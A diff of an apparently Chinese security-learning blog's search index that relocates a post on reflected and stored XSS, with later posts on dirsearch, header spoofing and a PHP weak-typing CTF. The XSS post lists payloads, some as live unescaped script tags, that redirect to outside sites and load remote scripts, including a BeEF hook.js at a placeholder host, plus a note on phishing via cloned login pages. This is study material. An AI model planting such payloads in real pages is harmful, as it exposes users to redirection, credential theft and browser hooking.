@@ -34,6 +34,27 @@
       </tags>
   </entry>
   <entry>
+    <title>网安篇（3）</title>
+    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
+    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
+<span id="more"></span>
+<h6 id="xss弹框"><a href="#xss弹框" class="headerlink" title="xss弹框"></a>xss弹框</h6><p>弹框警告<br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 </p>
+<p>php+HTML<br> &lt;scri.pt&gt;ale.rt(‘xss’)</p>
+<h6 id="弹框警告并重定向"><a href="#弹框警告并重定向" class="headerlink" title="弹框警告并重定向"></a>弹框警告并重定向</h6><script>al.ert("请移步到我们的新站");location.href="http://www.qfedu.com"</script> 
+<script>ale.rt('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script> 
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
+<h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></p>
+]]></content>
+      <categories>
+        <category>——网络安全</category>
+      </categories>
+      <tags>
+        <tag>——web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>网安篇（4）</title>
     <url>/2022/10/03/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%884%EF%BC%89/</url>
     <content><![CDATA[<h4 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h4><p>模式分隔符后的”i”标记这是一个大小写不敏感的搜索<br>模式中的 \b 标记一个单词边界，所以只有独立的单词”web”会被匹配，而不会匹配</p>
@@ -66,27 +87,6 @@
       </tags>
   </entry>
   <entry>
-    <title>网安篇（3）</title>
-    <url>/2022/10/02/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%883%EF%BC%89/</url>
-    <content><![CDATA[<h4 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h4><h5 id="xss主要分类："><a href="#xss主要分类：" class="headerlink" title="xss主要分类："></a>xss主要分类：</h5><p>反射型xss攻击（Reflected XSS） ：又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生的原因是攻<br>击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接(即每次攻击需要用户的点击)。<br>存储型XSS（Stored XSS) ：又称为持久型跨站点脚本，它一般发生在XSS攻击向量(一般指XSS攻击代码)存储在网站数据 库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大, 因为每当用户打开页面，查看内容时脚本将自动执行。</p>
-<span id="more"></span>
-<h6 id="xss弹框"><a href="#xss弹框" class="headerlink" title="xss弹框"></a>xss弹框</h6><p>弹框警告<br>此脚本实现弹框提示，一般作为漏洞测试或者演示使用,类似SQL注入漏洞测试中的单引号’, 一旦此脚本能执行，也就意 味着后端服务器没有对特殊字符做过滤&lt;&gt;/‘ 这样就可以证明，这个页面位置存在了XSS漏洞。 </p>
-<p>php+HTML<br> &lt;scri.pt&gt;ale.rt(‘xss’)</p>
-<h6 id="弹框警告并重定向"><a href="#弹框警告并重定向" class="headerlink" title="弹框警告并重定向"></a>弹框警告并重定向</h6><script>al.ert("请移步到我们的新站");location.href="http://www.qfedu.com"</script> 
-<script>ale.rt('xss');location.href="http://10.1.64.35/mutillidae/robots.txt"</script> 
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;al.ert(&quot;请移步到我们的新站&quot;);location.href=&quot;http://www.qfedu.com&quot;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;al.ert(&#x27;xss&#x27;);location.href=&quot;http://10.1.64.35/mutillidae/robots.txt&quot;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>这里结合了一些社工的思路，例如，通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信 息，则可能在另外的站点重新登录账户（克隆网站收集账户） </p>
-<h6 id="访问恶意代码"><a href="#访问恶意代码" class="headerlink" title="访问恶意代码"></a>访问恶意代码</h6><p>&lt;scri.pt src=”<a href="http://www.qfedu.com/xss.js&quot;&gt;">http://www.qfedu.com/xss.js&quot;&gt;</a><br>&lt;scri.pt src=”<a href="http://beef_ip:3000/hook.js&quot;&gt;">http://BeEF_IP:3000/hook.js&quot;&gt;</a></p>
-]]></content>
-      <categories>
-        <category>——网络安全</category>
-      </categories>
-      <tags>
-        <tag>——web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>网安篇（5）</title>
     <url>/2022/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/</url>
     <content><![CDATA[<h1 id="一、学习内容"><a href="#一、学习内容" class="headerlink" title="一、学习内容"></a>一、学习内容</h1><h2 id="1-1dirsearch下载及使用"><a href="#1-1dirsearch下载及使用" class="headerlink" title="1.1dirsearch下载及使用"></a>1.1dirsearch下载及使用</h2><pre><code> GitHub的下载地址为：https://github.com/maurosoria/dirsearch
@@ -98,7 +98,7 @@
 <p>​        -u 指定url</p>
 <p>-e 指定网站语言</p>
 <p>-w 可以加上自己的字典（带上路径）</p>
-<p>例如:<img src="/2022/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/10/30/%E7%BD%91%E5%AE%89%E7%AF%87%EF%BC%885%EF%BC%89/222.png" class title="This is an test image"></p>
+<p>例如:</p>
 <h2 id="1-2修改请求头为本地访问"><a href="#1-2修改请求头为本地访问" class="headerlink" title="1.2修改请求头为本地访问"></a>1.2修改请求头为本地访问</h2><p>X-Forward-For：127.0.0.1</p>
 <p>Referer：127.0.0.1</p>
 <h2 id="1-3xss漏洞"><a href="#1-3xss漏洞" class="headerlink" title="1.3xss漏洞"></a>1.3xss漏洞</h2><p>在登录界面随便输入一个账号密码，看一下返回的信息若得到错误的信息，发现url里面有get类型的错误参数，如果没有过滤的话我们将文字替换为可以得到xss漏洞，没有过滤，拿下xss。</p>
@@ -121,7 +121,7 @@
 
 
 
-<p>(1)这里包含了config.php<br>(2)url接收参数a和b的值<br>(3)如果$a等于0 and <img src="https://g.yuque.com/gr/latex?a%EF%BC%8C%E8%BE%93%E5%87%BA" alt="img">flag1<br>(4)如果<img src="https://g.yuque.com/gr/latex?b%E6%98%AF%E6%95%B0%E5%AD%97%E6%88%96%E8%80%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%82%A3%E4%B9%88%E9%80%80%E5%87%BA%E5%BD%93%E5%89%8D%E8%84%9A%E6%9C%AC%0A(5)%E5%A6%82%E6%9E%9C" alt="img">b&gt;1234，输出$flag2</p>
+<p>(1)这里包含了config.php<br>(2)url接收参数a和b的值<br>(3)如果$a等于0 and <img onerror="imgOnError(this);" data-fancybox="gallery" src="https://g.yuque.com/gr/latex?a%EF%BC%8C%E8%BE%93%E5%87%BA" alt="img" data-caption="img" loading="lazy">flag1<br>(4)如果<img onerror="imgOnError(this);" data-fancybox="gallery" src="https://g.yuque.com/gr/latex?b%E6%98%AF%E6%95%B0%E5%AD%97%E6%88%96%E8%80%85%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%82%A3%E4%B9%88%E9%80%80%E5%87%BA%E5%BD%93%E5%89%8D%E8%84%9A%E6%9C%AC%0A(5)%E5%A6%82%E6%9E%9C" alt="img" data-caption="img" loading="lazy">b&gt;1234，输出$flag2</p>
 <p>if(true and true){ //这里$a==0 and $a，==为弱类型比较，字符串开头都为0，所以0==0 and ‘b’，因为字符串b存在，所以and后面也为true，所以双true，最后if括号里为true，执行if下面的语句</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $flag1;</span><br><span class="line">&#125;</span><br><span class="line">if(is_numeric(2222a))&#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">if(2222a&gt;1234)&#123;</span><br><span class="line">echo $flag2;</span><br></pre></td></tr></table></figure>
 
